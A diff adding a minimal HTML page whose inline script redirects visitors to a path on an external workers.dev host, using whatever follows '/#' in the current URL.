@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+const url = window.location.href;
+const hashIndex = url.indexOf('/#');
+
+if (hashIndex !== -1) {
+  const tag = url.substring(hashIndex + 2); // gets everything after /#
+  window.location.replace('https://educational-purpose-content.bauer-bp.workers.dev/' + tag);
+}
+</script>
+</head>
+<body></body>
+</html>
